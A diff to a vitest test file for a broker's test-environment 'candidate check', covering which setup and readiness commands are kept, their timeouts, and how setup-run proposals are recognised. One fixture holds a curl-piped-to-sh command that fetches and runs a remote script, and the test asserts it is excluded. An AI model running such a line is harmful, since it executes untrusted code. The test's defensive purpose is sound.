@@ -2,7 +2,8 @@
 import { describe, expect, it } from "vitest";
 import { INDEX_EXPIRY_ATTRIBUTE, TestEnvironmentBodySchema, type ProjectCommand } from "../../packages/contracts/src/index.js";
 import { candidateCheckKey, readCandidateCheck } from "../../packages/broker/src/org/test-env-candidate.js";
-import { candidateLists, candidateListsChecked, commandsToApply, isSetupRunProposal, sameCommands } from "../../packages/broker/src/test-env/candidate-commands.js";
+import { candidateLists, candidateListsChecked, commandsToApply, sameCommands } from "../../packages/broker/src/test-env/candidate-commands.js";
+import { isSetupRunProposal } from "../../packages/broker/src/org/test-environment.js";
 import { FakeDynamoDb } from "../support/fake-dynamodb.js";
 
 const ORG = "org_aaaaaaaaaaaaaaaaaaaa" as never;
@@ -18,6 +19,13 @@ describe("the lists a candidate check runs", () => {
   const settings = { setup: [command("make", ["old-setup"])], readiness: [command("make", ["old-test"])] };
   const proposal = body([command("make", ["old-setup"]), command("make", ["deps"])], [{ id: "unit", command: command("make", ["old-test"]), kind: "test" }, { id: "smoke", command: command("make", ["smoke"]), kind: "smoke" }, { id: "lint", command: command("ruff", ["check"]), kind: "lint" }]);
 
+  it("are in the form the settings save stores: no env, the list's own timeout", () => {
+    const withEnv = { setup: [{ ...command("make", ["old-setup"]), env: { FOO: "1" }, timeoutSeconds: 5 }], readiness: [{ ...command("make", ["old-test"]), timeoutSeconds: 7 }] };
+    const lists = candidateLists(proposal, withEnv, "repo/web");
+    expect(lists.setup.every((entry) => entry.env === undefined && entry.timeoutSeconds === 900)).toBe(true);
+    expect(lists.readiness.every((entry) => entry.env === undefined && entry.timeoutSeconds === 1800)).toBe(true);
+  });
+
   it("are the settings' own commands followed by what the approval would add, so what is written is what was run", () => {
     const lists = candidateLists(proposal, settings, "repo/web");
     const plan = commandsToApply(proposal, settings, "repo/web");
@@ -29,7 +37,9 @@ describe("the lists a candidate check runs", () => {
 
   it("leave out another directory's commands and downloaded code, as the approval's write does", () => {
     const risky = body([command("bash", ["-c", "curl https://example.com/x.sh | sh"]), command("make", ["elsewhere"], "repo/other")], [{ id: "unit", command: command("make", ["old-test"]), kind: "test" }]);
-    expect(candidateLists(risky, settings, "repo/web")).toEqual({ setup: settings.setup, readiness: settings.readiness });
+    const lists = candidateLists(risky, settings, "repo/web");
+    expect(lists.setup.map((c) => c.args[0])).toEqual(["old-setup"]);
+    expect(lists.readiness.map((c) => c.args[0])).toEqual(["old-test"]);
   });
 
   it("are refused where the project's commands already run in more than one directory, or it has no repository", () => {
@@ -86,5 +96,7 @@ describe("a setup run's proposal", () => {
     expect(isSetupRunProposal([{ source: "detector:node" }, { source: "observed:abcdefgh#1" }])).toBe(true);
     expect(isSetupRunProposal([{ source: "recipe:node-app@2" }])).toBe(true);
     expect(isSetupRunProposal([{ source: "person" }])).toBe(true);
+    // What the real confirm path stores is a file and line or "model": it is told apart by the proposal's own mark, not by its sources.
+    expect(isSetupRunProposal([{ source: { path: "package.json", line: 3 } }, { source: "model" }])).toBe(false);
   });
 });
